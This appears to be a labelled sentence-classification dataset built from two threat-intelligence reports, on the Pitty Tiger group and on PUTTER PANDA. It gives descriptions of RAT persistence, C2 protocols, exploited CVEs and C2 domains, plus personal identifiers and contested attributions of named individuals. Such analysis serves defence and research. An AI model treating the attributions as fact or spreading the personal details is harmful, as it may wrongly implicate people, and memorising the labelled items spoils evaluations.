Although we have not been able to find evidences of any attack aimed at exploiting vulnerabilities on the group 's targets servers , we have been able to record several vulnerability scanning launched from one c & c server straight to the targets .	1
The attackers have been using different vulnerability scanners aimed at their targets .	1
While some targets have been scanned with '' generic '' vulnerability scanning tools like HScan or Fluxay and port scanners like Nmap , some other targets have been scanned for very specific vulnerabilities , like a ZyWALL vulnerability or a FORTINET product .	1
We have also been able to testify that the Pitty Tiger group has successfully collected information on some of their targets by exploiting the HeartBleed bug .	1
This vulnerability which exists on some old versions of OpenSSL allows attackers to collect data from chunks of memory from the targeted machine .	1
It allowed the Pitty Tiger group to get admin credentials from at least one target , for example .	1
Running automated vulnerability scanners on whole ranges of IP addresses used by the targets or on several domains is a very noisy way to collect information and find server vulnerabilities .	1
We would advocate that this method is unwise when you want to stay furtive , and doing it from a c & c server is very surprising , to say the least .	0
While the Pitty Tiger group is experienced on some aspects on its running APT campaigns , it definitely lacks some maturity here .	0
One of the favorite methods used by the Pitty Tiger group to infect users is to use a Microsoft Office Word document which exploits a specific vulnerability .	1
The payload infecting the system is malware known as '' Troj/ReRol.A '' .	1
It is generally the first step of the initial compromise for Pitty Tiger campaigns .	0
We have been able to find one such document used by that group of attacker , exploiting CVE- 2012-0158 , an old critical vulnerability impacting Microsoft Office and corrected by Microsoft's MS12-027 fix in April 2012 .	1
This vulnerability affects Microsoft Office versions up to Office 2010 .	0
We also found one RTF document embedding CVE-2014-1761 , which is a more recent exploit .	1
We discovered several different documents spreading this malware by triggering CVE-2012-0158 vulnerability , yet we could not share them in this report , since these documents contain information about victims of the Pitty Tiger group .	1
The discovery of this '' old '' vulnerability exploitation in June 2014 could mean that the Pitty Tiger group has no direct access to 0day exploits , or not enough budgets to buy some .	0
It could also mean they use their low range exploit by default because it is working on their targets and is sufficient to compromise their workstations .	0
The Word document we initially found was probably a '' test '' document used by the group .	0
When opened , it shows a single line written in Chinese language , which can be translated as '' Hello ! '' When successfully triggered , the exploit infects the host by dropping and executing a file named '' svohost.exe '' in the temporary folder of the currently logged-in user : This binary is '' Troj/ReRol.A '' according to Sophos naming convention .	1
It immediately triggers alarms on our sandbox : The binary drops a copy of itself in the Application Data folder of the currently logged-in user : The malware initiates a communication to time.windows.com to check for connectivity , and then communicates with the c & c server at mac.avstore.com.tw .	1
Very few variants of Troj/ReRol.A are public .	0
The variants we have seen did use that same User- Agent : The persistence mechanism used by the malware is the creation of a registry key named '' Shell '' containing the path to the malware on the infected system : The payload of this malware is used to collect information on the newly infected host , and send it back to the c & c server .	1
It can also download and execute binaries .	1
The data sent in the POST request has a 0x11 bytes header consisting of a fixed-value byte ( 0xc3 ) followed by a 0x10 bytes encryption key .	1
The data following the header is encrypted using RC4 with the previous key .	1
Once the data is deciphered , the last byte of the clear text should also be 0xc3 .	0
We have been able to decrypt the communications and confirmed what is transmitted to the c & c server .	0
Here is an anonymized sample of communication showing information collected by the malware : This information is very useful for an attacker : it shows all software installed on the system , and running services .	1
Once this data has been transferred to the c & c server , it responds by sending additional malware to execute on the machine .	1
The c & c part consists of two files : The dr.asp registers the following keywords : These two binaries were no longer available on the server .	0
However , we found various files which could have been used as '' 32.exe '' in the past : The 322.exe file is a legitimate , Chinese , calc.exe tool .	0
It might have been used by the attackers to perform tests .	0
The 3 others binaries are RATs , which will be detailed in the next parts .	0
This RAT is the origin of the attackers ' group name .	0
'' PittyTiger '' is a mutex used by the malware .	0
'' Pitty Tiger '' is also a string transmitted in the network communications of the RAT , as you will see in this chapter .	0
The malware , when running in our sandbox , triggers the following alarms : The binary drops two files in '' C : \Windows\System32 '' : The '' qmgrxp.exe '' binary is a simple copy of the original binary .	1
It drops the '' packet64.dll '' , and injects it in '' explorer.exe '' .	1
When executed , a mutex called '' PittyTiger '' is created .	1
Persistence is achieved by adding the path to the binary to the WinlogonUserInit key : The '' packet64.dll '' is the main payload of the RAT .	1
After being injected , it starts sending its Hello packet to its c & c server : All the requests sent to the c & c contains the string '' /FC001/ '' followed by the bot id .	1
This id consists of the infected computer name followed by a dash and the lower word of the disk serial id .	0
The data sent is simply encoded using base64 , there is no cipher at all .	1
The hello packet , once decoded , looks like the following : Our sample had 3 c & c servers configured : The following commands are implemented : Regarding the controller part , we found two different versions : The interface handling both Pitty TIGER and CT connections is very interesting .	1
We have been able to confirm that the author of those two families of malware is the same person , as will be seen in the next chapter about '' CT RAT '' .	0
This remote administration tool is often used by the Pitty Tiger group .	1
We have been able to acquire both the client and the server parts .	0
We found two instances of the same binary with different names – 32mm.exe and mm32.exe .	0
This RAT seems to be an evolution of PittyTiger , since a specific server binary we found could handle both requests from CT and PittyTiger , and was indicated as compatible with PittyTiger .	0
Moreover , the same commands are implemented in both RATs .	1
Unsurprisingly , when running in our sandbox , the RAT triggers the same alarms as PittyTiger : The binary drops two files in '' C : \Program Files\Internet Explorer '' : The '' ieupdate.exe '' is a simple binary to inject the DLL into '' explorer.exe '' .	1
Persistence is achieved via the following registry key : After injection , the RAT sends a first login packet to its c & c : The RAT communication is performed through HTTP requests .	1
The data is sent encrypted with RC4 , and base64-encoded .	1
The RC4 key is the Unicode form of the requested URL .	0
The Login packet contains the following string , after decoding and deciphering : It contains the computer name , the user name , the internal IP address , the OS version , the RAT internal version and the Language ID of the system .	1
The RAT can then receive commands from its c & c .	1
Usual RAT features are implemented : Regarding the configuration , our sample communicates with '' sop.avstore.com.tw '' , and contains the string '' Nov 13 2013 '' , which should be a version identifier .	1
The c & c part is a Windows binary written in .NET	0
.	0
We found 2 versions : The About form gives the name of the developer ( s ) : The version of the controller which can handle both PittyTiger and CT shows the same author ( s ) : As these screenshots show , the switch between PittyTiger and CT was probably in the last semester of 2013 .	0
The text can be translated , thanks to Google Translate , as : Further discussion about this author is provided in subsequent sections .	0
We named this malware '' MM RAT '' at the beginning of our investigation , before we found an existing name for it , '' Troj/Goldsun-B '' according to Sophos .	0
This is another remote administration tool often used by the Pitty Tiger crew .	1
We have been able to acquire both a client and server part for it .	0
The binary we found is named 3200.exe , and triggers the following alarms in our sandbox : The '' release.tmp '' file is dropped on the system : The binary is also copied to the user 's '' Application Data '' directory , and injects the '' release.tmp '' file in '' explorer.exe '' .	1
Persistence is achieved by adding the path to the binary to the Winlogon Shell key : The RAT embeds its own DNS server IP addresses to make the c & c domain names resolutions .	1
These addresses are listed below : It starts resolving its domains after injection , and immediately sends requests .	1
First requests are used to check for updates ( GET request on /httpdocs/update/update.ini ) .	1
A Hello packet is then sent : The bot then repeatedly sends GET requests on '' /httpdocs/mm/ < botid > /ComMand.sec '' to retrieve remote commands .	1
The communication protocol is quite simple : GET requests are used to receive data from the c & c , and POST requests to send data .	1
In POST commands , the CGI name represents the command .	1
The following features are implemented : The following CGI files can be requested by the bot : The configuration is stored locally in a file called '' schmup.sys '' .	1
The file is ciphered using RC4 , using the MD5 hash of '' rEdstArs '' as the key .	1
Our sample uses '' mca.avstore.com.tw '' , '' star.yamn.net '' and '' bz.kimoo.com.tw '' as c & c servers .	1
It contains the '' 1.6.0 '' version number , and uses the password '' 9ol.8ik , '' to authenticate with the bots .	0
Unlike others c & c binaries , the c & c part of this RAT does not have a graphical interface , but can be remotely requested to manage the bots .	1
Furthermore , no authentication is required to send commands to the c & c ( but you need to know the configured password to interact with the bots ) .	1
The management protocol is the same as the bots protocol , with different CGI files : The bots ' answers to remote commands can be retrieved by requesting the '' Reply.sec '' file ( e.g .	0
GET /httpdocs/mm/ < botid > /Reply.sec ) These network patterns might ring bells in some researcher 's minds .	0
The network communication used by this binary are the same as those used by the Enfal malware , which has been used in the past by the Lurid group ( APT attackers ) and by other threat actors in China .	0
An examination of the code did not reveal code similarities with the Enfal malware .	0
We do not currently know why this malware uses the same patterns to communicate .	1
This is another remote administration tool used by the Pitty Tiger group .	1
We have been able to get both a client and server part of it .	0
The binary we found was dropped by a malicious Word document .	1
The following alarms are triggered in the sandbox : The shellcode contained in the Word file drops the following file , and executes it : This one drops in turn the following file : This tmp file is then copied to '' C : \Windows\system32\Nwsapagentex.dll '' and registered as a service called '' Nwsapagent '' .	1
This malware is a variant of the infamous Gh0st RAT .	0
Our specific sample uses '' ssss0 '' instead of the usual '' Gh0st '' header for network communications .	0
The commands ID used in the communication protocol have also changed , but the features are quite the same .	0
The configuration is directly embedded in the binary , and deciphered at runtime .	0
Up to 5 c & c servers can be configured , but our sample only had one : '' ey.avstore.com.tw:53 '' .	1
'' EY '' could stand for '' Ernst & Young '' .	0
It would not be very surprising , since a lot of different attack groups do use anti-virus vendors or other big company 's names to try to look more legitimate .	0
Pitty Tiger is no exception , as detailed later in this report .	0
We also found two c & c binaries , claiming to be versions 2.1 and 2.2 of the Paladin RAT controller .	0
Version 2.1 answers to the '' ssss0 '' header , while version 2.2 uses the classical '' Gh0st '' header .	0
Additionally to the Paladin RAT , we found another variant of Gh0st RAT , named '' Leo '' .	0
Although we have found it on a c & c server of the group , there is no evidence that is has been used by the group , in opposition to Paladin which is used often by Pitty Tiger .	0
Moreover , the built malware we found in the same folder was configured to connect to a local IP address , probably for testing purposes .	1
Our investigation has focused on three particular c & c servers used by the group .	0
These c & c servers , unlike the other c & cs used by the group , have been misconfigured .	0
Once parsed and dumped , it provided us with more insight .	0
We found several domains used by the Pitty Tiger group , the most interesting ones being detailed in this chapter .	0
Pitty Tiger , like other APT attackers , often use anti-virus '' familiar names '' when registering domains or creating subdomains .	0
Some examples can be avstore.com.tw , sophos.skypetm.com.tw , symantecs.com.tw , trendmicro.org.tw etc .	0
The registration information for this domain has been the same since 2013-06-04 : This information has been used to register another domain , skypetm.com.tw , which has also been used by the Pitty Tiger group .	0
Our research also led us to the discovery of four different malware families connected to subdomains of avstore.com.tw : This domain has shown two different WHOIS entries through time : The most recent registration information is also used for avstore.com.tw .	0
Six malware families have been identified as communicating with subdomains of skypetm.com.tw : Avstore.com.tw and skypetm.com.tw have 4 malware families in common , communicating to subdomains of both domains : Some domains registered by the group are very old .	1
There is an increase in the registrations from 2010 on .	0
All the e-mail addresses used are connected to the Pitty Tiger group .	0
Mapping the victims of such a targeted campaign is not an easy task .	0
We have found the Pitty Tiger group to be very active against one particular private company from the defense industry and one academic network of a government , , yet we think it was done to be used as a proxy for some of the group 's operations .	0
We have also found some connections from other companies to the c & c servers , yet we did not find evidence that they were real victims .	0
These alleged victims do work in different sectors and are located mostly in European countries .	0
It might be surprising to see a company specialized in web development here , yet it has built websites for interesting potential targets .	0
We suspect Pitty Tiger to use this compromise to spear phish other companies which are in commercial relation with this web development company .	1
We have to mention that we only had access to three of the several attackers ' servers .	0
Therefore , we suppose the Pitty Tiger group could have more targets than what we could confirm .	0
We also found a lot of vulnerability scanners launched by the attackers at different targets , yet there was no sign of compromise .	1
During the course of our investigations , we discovered a RAR archive on the attacker 's server containing 5 Word documents and one small C source code .	0
These documents belong to the defense company which has been compromised .	0
According to the name of the files and the general feel of the archive , we do think it was extracted by the attackers to '' show '' someone what kind of data they could get from the compromise of that particular target .	1
The documents were still exhibiting comments from various users , showing it was an ongoing work and not old documents .	0
Interestingly enough , we saw a part of these documents appear on Virus-Total , with an additional '' gift '' from the attackers , a payload dropping a malware .	1
There are only two options we can think of here :  Someone from the same company has been targeted with this document .	1
 Someone from another company has been targeted with this document .	1
This other company could be a partner or competitor .	0
Since we were unable to determine the intended use of this specific document , we can only suppose that it could be used to provide commercial advantages to competitors of that company , or used by a foreign state .	0
During our investigation , we found out interesting information about the Pitty Tiger group itself .	0
After analyzing the various collected elements , we have tried to draw a portrait of this particular threat .	0
We have been able to get all the RDP connections logs to one c & c server : These connections are either VPS or dynamic IP addresses , mostly from China .	0
A computer named CHMXY-PC connected to the c & c via RDP with IP address 58.61.40.5 .	1
The IP is in an ADSL dynamic pool in the Gangzhou area ( Guangdong province ) : A few connections to the c & c were done by a computer named TIEWEISHIPC with IP address 27.16.139.143 .	1
This IP address belongs to an ADSL dynamic pool in the Wuhan area ( Hubei's provincial capital ) .	0
Some connections to the c & c originated from a computer named FLY-THINK with several IP addresses , all located in Fuqing ( Fujian province ) .	1
The IP addresses are in an ADSL dynamic pool : Most of the connections to the c & c server were coming from a computer named 50PZ80C- 1DFDCB8 with several IP addresses .	1
There are 11 IP addresses from Chinese dynamic ADSL ranges : 9 from Fuqing ( Fujian province ) , one from Fuzhou ( Fujian 's province capital ) and one from Nanchang ( Jiangxi 's province capital ) .	0
The last one came from a VPS instance located in Los Angeles ( California , USA ) but purchased by a China based VPS provider XeVPS which belong to the AS38197 ( Sun Network Hong Kong Limited ) .	0
The two computers FLY-THINK and 50PZ80C-1DFDCB8 have used distinct IP addresses to connect to the c & c , yet some of these IP addresses come from the same IP range : We mapped these RDP connections to have a graphical view : We found that a member of this group of attackers used some tools on his own system , for testing purposes .	1
This information was still available when we got access to the c & c server .	0
He launched some tests with the CT RAT we exposed earlier : Here we can see a user '' Toot '' from a machine named '' toot-2a601225a8 '' logging in the CT RAT and executing some commands .	1
The c & c IP address , 198.100.113.27 , can be seen there .	0
Other log files showed that '' Toot '' is using virtual machines for his tests .	0
We can also see the system : Microsoft Windows XP SP3 .	0
The '' P '' field is the language ID .	0
1028 means '' Chinese traditional '' .	0
We have also seen tests run by '' toot '' with a language ID of 2052 , which is '' Chinese simplified '' .	0
The '' M '' field is probably used for versioning .	0
It is a hardcoded string in the binary .	0
After these tests , we could see some real connections to a victim using this RAT .	1
Here is a follow-up of the commands launched by the bot controller , in a standard command-line shell : The attacker goes on like this , using his tools , and then ends the communication with this RAT on that computer .	0
Please note that at this point , the attacker has at least the privileges of a local administrator , since he is allowed to write content in the system32 folder of a Windows XP system .	1
He could also gain the credentials to a sensitive e-mail account .	1
In addition to all information already shown , we saw Toot connect to an account on a cloud service named '' Baidu Drive '' .	0
The e-mail address linked to this account is dyanmips @ qq.com ( QQ-ID : 2589315828 ) .	0
We could find traces of two other e-mail accounts associated to Toot , ciscodyanmips @ qq.com ( QQ ID : 204156335 ) and ciscodynamips @ qq.com ( QQ ID : 1878836793 ) .	0
We did not find more information about user '' Toot '' , yet we miss Chinese language capabilities .	0
The controller part of CT RAT/PittyTiger RAT revealed the following '' about '' information , once translated from Chinese to English language : CT console ( compatible pittytiger ) v1.3 2013.12 by Trees and snow We believe this translation of the author 's name might not be accurate due to the use of automated translation tools .	0
Moreover , we have strong suspicions that there is not a single individual nicknamed '' Trees and snow '' but rather two programmers nicknamed '' Trees '' and '' Snow '' .	0
'' Trees '' could also be '' Cold '' .	0
We noticed that the symbol for this word is translated differently according to the context it is used in .	0
Once again , we lack Chinese language skills .	0
We identify the two nicknames on the current campaign as Automn Snow ( 秋雪 ) and Cold Air Kiss ( 风吻寒 ) .	0
While we are confident that these people are indeed the developers of both PittyTiger and CT RAT malware , we are not sure they belong to the PittyTiger group .	0
These developers might just have been hired to develop these RATs .	0
They might also just be selling it to the PittyTiger group .	0
There is no trace of usage from other attacking groups , we believe the PittyTiger RAT is exclusively used by this group of attackers .	0
According to indicators we gathered and threat activities profiling we have some hypothesis on the way the group is conducting its operations .	0
We have strong evidence of a bot operator position .	0
We identify one nickname for this position , the user known as TooT .	0
As we did not see other nickname , we think that TooT is one person and not a group of persons .	0
We also identified a malware development position .	0
We identified two nicknames for this position on the current campaign , Automn Snow ( 秋雪 ) and Cold Air Kiss ( 风吻寒 ) .	0
Yet we are unsure that they belong to the group , they might just be a third party providing or selling their malware .	0
We have a strong suspicion of a coordinator position , which coordinates the bot operator , provides him with some logistics support ( weaponized document , tools… ) and reviews the programmers work .	0
This position could imply a communication channel with another manager .	0
We named this position 'Chen ' , in relation with several references of this common Chinese name in c & c WHOIS and other investigation materials .	0
We have some suspicion of a customer relationship manager position that may act as an interface between a customer and Chen .	0
We named this position 'Lilly ' .	0
The c & c servers used by the attackers revealed a lot of interesting files stored in various folders : This is quite the usual arsenal for a group of APT attackers : What is rare to find is the controller part of those tools .	1
We have been lucky enough to get the controller part of Pitty Tiger and CT RAT , and even to get a kind of hybrid controller made for CT RAT but also supporting Pitty Tiger .	0
We suppose that the CT RAT is the new evolution of Pitty Tiger and that it will replace Pitty Tiger in the following months .	0
The presence of a Chinese version of '' calc.exe '' , the official calculator provided in Microsoft Windows , is interesting .	0
Not only is it one more indicator of a probable Chinese origin , but also an indicator that this server was probably used as a test base , in addition to being operational and controlling infected machines from different targets .	1
In addition to those tools , we found some interesting scripts .	0
A script named ipc.bat uses a file named user.txt to try to brute-force a shared folder access : The user.txt file contains thousands of lines , each one being a couple of one particular username and one password attempt : This user.txt file has been anonymized , yet we wanted to give you the feel for it .	1
This file is 67320 lines long , and uses 5610 different passwords for each of 12 users contained in this file .	0
The user names are clearly the result from a user enumeration and are dedicated to a particular French victim .	0
The passwords listed in this file are either build from several campaigns or from the current campaign .	0
A lot of passwords are related to the targeted company and might be previous passwords from users .	0
We have also discovered a pack of files which can be used to trigger an Internet Explorer vulnerability ( CVE-2014-0322 ) .	0
The date of these files , namely Tope.swf and index.html , was 2014/02/18 , a few days after the revelation of existing exploits in the wild used in APT attacks .	0
We do not know if the Pitty Tiger group used this exploit or not , but found no trace indicating they did .	0
A lot of different attackers seem to have used that vulnerability since .	0
Determining who is exactly behind an APT campaign is difficult .	0
We tried to extract different technical indicators , together with contextual elements .	0
Information relating to the tools used by the attackers has been leveraged for attribution : The IP addresses used for the hosting of the c & c domains are mainly located in Taipei ( Taïwan ) and Hong Kong City ( Hong Kong Special Administrative Region , PRC ) : Most RDP connections to the c & c infrastructure come from Chinese IP ranges in Fuqing ( Fujian province , PRC ) .	1
Yet some IP addresses in the USA and in Hong Kong have also been found ; All the items listed in this chapter are strong indicators that the attackers might be Chinese .	0
Pitty Tiger is a group of attackers that have been active since at least 2011 .	0
Pitty Tiger is effective and mature in the use of targeted malware , the use of known exploits to infect computers with their malware and the creation of an infrastructure to efficiently conduct APT attacks .	1
They are quite unprofessional in their way of using their infrastructure : they do launch vulnerability scanners directly from a c & c server and also use their connection for personal activities ( downloading pornographic material for example , as we have seen a whole folder on a c & c server full of xxx torrent links ) .	1
Pitty Tiger is probably not a state-sponsored group of attackers .	0
The attackers lack the experience and financial support that one would expect from state-sponsored attackers .	0
We suppose this group is opportunistic and sells its services to probable competitors of their targets in the private sector .	0
One governmental network has been targeted by the group , yet we do not have any evidence of the purpose of this attack .	0
We suppose this particular attack has been executed to provide a usable bounce for the group .	0
The campaign we studied has been largely focused on one particular target .	0
We suspect the Pitty Tiger group to work according to an opportunistic business model : this group might offer its services to third parties from the private sector .	0
This group seems to be very small compared to other APT groups .	0
We have leveraged several profiles and could identify some attackers to a certain extent .	0
We believe this group might keep working as it is now , with limited budgets , or grow to extend its attacking campaign capabilities .	0
This list of indicators is provided in order to help people detect Pitty Tiger APT campaign .	0
In May 2014 , the U.S. Department of Justice charged five Chinese nationals for economic espionage against U.S. corporations .	0
The five known state actors are officers in Unit 61398 of the Chinese People 's Liberation Army ( PLA ) .	0
In response , the Chinese government stated that the claims were '' absurd '' and based on '' fabricated facts '' .	0
China then went even further , stating '' The Chinese government , the Chinese military and their relevant personnel have never engaged or participated in cyber theft of trade secrets .	0
'' We believe that organizations , be they governments or corporations , global or domestic , must keep up the pressure and hold China accountable until lasting change is achieved .	0
Not only did the U.S. Government offer in its criminal indictment the foundation of evidence designed to prove China 's culpability in electronic espionage , but also illustrated that the charges are only the tip of a very large iceberg .	0
Those reading the indictment should not conclude that the People 's Republic of China ( PRC ) hacking campaign is limited to five soldiers in one military unit , or that they solely target the United States government and corporations .	0
Rather , China 's decade-long economic espionage campaign is massive and unrelenting .	0
Through widespread espionage campaigns , Chinese threat actors are targeting companies and governments in every part of the globe .	0
At CrowdStrike , we see evidence of this activity first-hand as our services team conducts Incident Response investigations and responds to security breaches at some of the largest organizations around the world .	0
We have first-hand insight into the billions of dollars of intellectual property systematically leaving many of the largest corporations - often times unbeknownst to their executives and boards of directors .	0
The campaign that is the subject of this report further points to espionage activity outside of Unit 61398 , and reveals the activities of Unit 61486 .	0
Unit 61486 is the 12th Bureau of the PLA 's 3rd General Staff Department ( GSD ) and is headquartered in Shanghai , China .	0
The CrowdStrike Intelligence team has been tracking this particular unit since 2012 , under the codename PUTTER PANDA , and has documented activity dating back to 2007 .	0
The report identifies Chen Ping , aka cpyy , and the primary location of Unit 61486 .	0
This particular unit is believed to hack into victim companies throughout the world in order to steal corporate trade secrets , primarily relating to the satellite , aerospace and communication industries .	0
With revenues totaling $ 189.2 billion in 2013 , the satellite industry is a prime target for espionage campaigns that result in the theft of high-stakes intellectual property .	0
While the gains from electronic theft are hard to quantify , stolen information undoubtedly results in an improved competitive edge , reduced research and development timetables , and insight into strategy and vulnerabilities of the targeted organization .	0
Parts of the PUTTER PANDA toolset and tradecraft have been previously documented , both by CrowdStrike , and in open source , where they are referred to as the MSUpdater group .	0
This report contains details on the tactics , tools , and techniques used by PUTTER PANDA , and provides indicators and signatures that can be leveraged by organizations to protect themselves against this activity .	0
Our Global Intelligence Team actively tracks and reports on more than 70 espionage groups , approximately half of which operate out of China and are believed to be tied to the Chinese government .	0
This report is part of our extensive intelligence library and was made available to our intelligence subscribers in April 2014 , prior to the US Government 's criminal indictment and China 's subsequent refusal to engage in a constructive dialog .	0
Targeted economic espionage campaigns compromise technological advantage , diminish global competition , and ultimately have no geographic borders .	0
We believe the U.S. Government indictments and global acknowledgment and awareness are important steps in the right direction .	0
In support of these efforts , we are making this report available to the public to continue the dialog around this ever-present threat .	0
CrowdStrike has been tracking the activity of a cyber espionage group operating out of Shanghai , China , with connections to the People 's Liberation Army Third General Staff Department ( GSD ) 12th Bureau Military Unit Cover Designator ( MUCD ) 61486 , since 2012 .	0
The attribution provided in this report points to Chen Ping , aka cpyy ( born on May 29 , 1979 ) , as an individual responsible for the domain registration for the Command and Control ( C2 ) of PUTTER PANDA malware .	0
In addition to cpyy , the report identifies the primary location of Unit 61486 .	0
PUTTER PANDA is a determined adversary group , conducting intelligence-gathering operations targeting the Government , Defense , Research , and Technology sectors in the United States , with specific targeting of the US Defense and European satellite and aerospace industries .	0
The PLA 's GSD Third Department is generally acknowledged to be China 's premier Signals Intelligence ( SIGINT ) collection and analysis agency , and the 12th Bureau Unit 61486 , headquartered in Shanghai , supports China 's space surveillance network .	0
Domains registered by Chen Ping were used to control PUTTER PANDA malware .	0
These domains were registered to an address corresponding to the physical location of the Shanghai headquarters of 12th Bureau , specifically Unit 61486 .	0
The report illuminates a wide set of tools in use by the actors , including several Remote Access Tools ( RATs ) .	1
The RATs are used by the PUTTER PANDA actors to conduct intelligence-gathering operations with a significant focus on the space technology sector .	1
This toolset provides a wide degree of control over a victim system and can provide the opportunity to deploy additional tools at will .	1
They focus their exploits against popular productivity applications such as Adobe Reader and Microsoft Office to deploy custom malware through targeted email attacks .	1
This report contains additional details on the tactics , tools , and techniques used by PUTTER PANDA , and provides indicators and signatures that can be leveraged by organizations to protect themselves against this activity .	0
➔ Putter Panda is a cyber espionage actor that conducts operations from Shanghai , China , likely on behalf of the Chinese People 's Liberation Army ( PLA ) 3rd General Staff Department 12th Bureau Unit 61486 .	0
This unit is supports the space based signals  intelligence ( SIGINT ) mission .	0
➔ The 12th Bureau Unit 61486 , headquartered in Shanghai , is widely accepted to be China 's primary SIGINT collection and analysis agency , supporting China 's space surveillance network .	0
➔ This is a determined adversary group , conducting intelligence- gathering operations targeting the Government , Defense , Research , and Technology sectors in the United States , with specific targeting of space , aerospace , and communications .	0
➔ They focus their exploits against popular productivity applications such as Adobe Reader and Microsoft Office to deploy custom malware through targeted email attacks .	1
➔ CrowdStrike identified Chen Ping , aka cpyy , a suspected member of the PLA responsible for procurement of the domains associated with operations conducted by Putter Panda .	0
➔ The group has been operating since at least 2007 and has been observed heavily targeting the US Defense and European satellite and aerospace industries .	0
➔ There is infrastructure overlap with Comment Panda , and evidence of interaction between actors tied to both groups .	0
There are several pieces of evidence to indicate that the activity tracked by CrowdStrike as PUTTER PANDA is attributable to a set of actors based in China , operating on behalf of the Chinese People 's Liberation Army ( PLA ) .	0
Specifically , an actor known as cpyy ( Chen Ping ) appears to have been involved in a number of historical PUTTER PANDA campaigns , during which time he was likely working in Shanghai within the 12th Bureau , 3rd General Staff Department ( GSD ) .	0
PUTTER PANDA has several connections to actors and infrastructure tied to COMMENT PANDA , a group previously attributed to Unit 61398 of the PLA .	0
Although some of the domains used for command and control of the tools described later in this report appear to be legitimate sites that have been compromised in some way , many of them appear to have been originally registered by the operators .	1
Table 1 shows the domains that appear to have been registered by these actors , and the original email address used where known .	0
The most significant finding is that an actor known as cpyy appears to have registered a significant number of C2 domains .	0
This actor is discussed in the next section .	0
Many of the domains have had their registrant information changed , likely in an attempt to obfuscate the identity of the operators .	0
For instance , several domains originally registered by cpyy had their email address updated to van.dehaim @ gmail.com around the end of 2009 ; for siseau.com the change occurred between July 2009 and November 2009 , and for vssigma.com , the change occurred between August 2009 and December 2009 .	0
Historical registrant information for anfoundation.us , rwchateau.com , and succourtion.org was not available prior to 2010 , but it is likely that these domains were also originally registered to a personally attributable email account .	0
Similarly , several domains registered to mike.johnsonmj @ yahoo.com have had their registrant email updated during March 2014 ( see Table 2 ) .	0
These registrant changes may indicate an increased awareness of operational security ( OPSEC ) from the PUTTER PANDA actors .	0
The recent changes to the domains shown in Table 2 may indicate that the operators are preparing new campaigns that make use of this infrastructure , or they are attempting to disassociate all these .	0
Although no attributable information was found on the email addresses associated with the domains described above ( aside from cpyy and httpchen – see below ) , several other domains were found to have been registered by some of these addresses .	0
These are shown in Table 3 , and may be used for command and control of PUTTER PANDA tools .	1
domains from a single email address , perhaps due to OPSEC concerns or issues with the specific email account .	0
The subdomains associated with these domains via DNS records , along with some of the domain names themselves , point to some areas of interest for the PUTTER PANDA operators ( see also Droppers in the following Technical Analysis section ) : • Space , satellite , and remote sensing technology ( particularly within Europe ) ; • Aerospace , especially European aerospace companies ; • Japanese and European telecommunications .	0
It is likely that PUTTER PANDA will continue to attack targets of this nature in future intelligence- gathering operations .	0
Based on passive DNS records , several PUTTER PANDA associated domains have resolved to IP address 100.42.216.230 : Additionally , several subdomains of ujheadph.com resolved to this IP : Another subdomain of ujheadph.com has been observed in connection with distinctive traffic originating from the 3PARA RAT ( described below ) , making it probable that this domain is also associated with PUTTER PANDA .	0
The decipherment.net domains resolved to this IP address from 11 October 2012 to at least 25 February 2013 , and the botanict.com domain resolved from 11 October 2012 to 24 March 2013 .	0
During part of this timeframe ( 30 June 2012 - 30 October 2012 ) , a domain associated with COMMENT PANDA resolved to this same IP address : login .	0
aolon1ine.com .	0
Additionally , for a brief period in April 2012 , update8.firefoxupdata.com also resolved to this IP address .	0
The use of the same IP address during the same time suggests that there is perhaps some cooperation or shared resources between COMMENT PANDA and PUTTER PANDA .	0
Although not as conclusive as the links to COMMENT PANDA , IP address 31.170.110.163 was associated with VIXEN PANDA domain blog .	0
strancorproduct.info from November to December 2013 .	0
In February 2014 , this IP address was also associated with PUTTER PANDA domain ske.hfmforum .	0
com .	0
While not directly overlapping , this potential infrastructure link is interesting , as VIXEN PANDA has previously displayed TTPs similar to COMMENT PANDA ( other CrowdStrike reporting describes VIXEN PANDA malware that extracts C2 commands embedded between delimiters in web content ) , and has extensively targeted European entities .	0
11 Several email addresses have been associated with cpyy , who also appears to use the alternate handles cpiyy and cpyy.chen : The cpyy.net domain lists '' Chen Ping '' as the registrant name , which may be cpyy 's real name , as this correlates with the initials '' cp '' in '' cpyy '' .	0
A personal blog for cpyy was found at http : //cpiyy.blog.163.com/ .	0
The profile on this blog ( shown in Figure 2 below ) indicates that the user is male , was born on 25 May 1979 , and works for the '' military/police '' ( 其他- 军人/警察 ) .	0
This blog contains two postings in the '' IT '' category that indicate at least a passing interest in the topics of networking and programming .	0
A related CSDN profile for user cpiyy indicates that cpyy was working on or studying these topics in 2002 and 2003 .	0
Another personal blog for cpyy ( http : //www.tianya.cn/1569234/bbs ) appears to have last been updated in 2007 .	0
This states that the user lives in Shanghai , and has a birthdate identical to that in the 163.com blog .	0
cpyy was also active on a social networking site called XCar , stating that he lived in Shanghai as early as 2005 through 2007 ; he said in a post , '' Soldier 's duty is to defend the country , as long as our country is safe , our military is excellent '' , indicating a feeling of patriotism that could be consistent with someone who chose a military or police-based career .	0
On the XCar forum , cpyy.chen used a subforum called POLO ( hacker slang for '' Volkswagen cars '' ) to communicate with other users Linxder , peggycat , '' Naturally do not understand romance '' ( 天生不懂浪漫 ) , '' a wolf '' ( 一只大灰狼 ) , '' large tile '' ( 大瓦片 ) , '' winter '' ( 冬夜 ) , '' chunni '' ( 春妮 ) , papaya , kukuhaha , Cranbing , '' dusty sub '' ( 多尘子 ) , z11829 , '' ice star harbor '' ( 冰星港 ) , '' polytechnic Aberdeen '' ( 理工仔 ) , '' I love pineapple pie '' ( 我爱菠罗派 ) , and '' she 's distant '' in 2007 .	0
Although superficially the discussion is about cars , there is a repeated word in the text , '' milk yellow package '' or '' custard package '' or '' yoke package '' ( 奶黄包 ) .	0
This could be a hacker slang word , but it is unclear as to the definition .	0
The conversation alludes to Linxder being the '' teacher '' or '' landlord '' and the other aforementioned users are his '' students '' .	0
Linxder references how he has '' found jobs '' for them .	0
It is possible that this is a reference to hacking jobs wrapped up in car metaphors .	0
Linxder is the handle of an actor associated with the likely Shanghai-based COMMENT PANDA group .	0
Linxder , cpyy , and xiaobai have all discussed programming and security related topics on cpyy 's site , cpyy.org , which hosted a discussion forum for the 711 Network Security Team ( see below ) .	0
cpyy also appears to have a keen interest in photography ; his 163.com blog includes several photographs taken by cpyy in the blog postings and albums section .	0
Some of these photographs also appear in a Picasa site ( examples are shown in Figures 5 and 6 ) belonging to a user cpyy.chen .	0
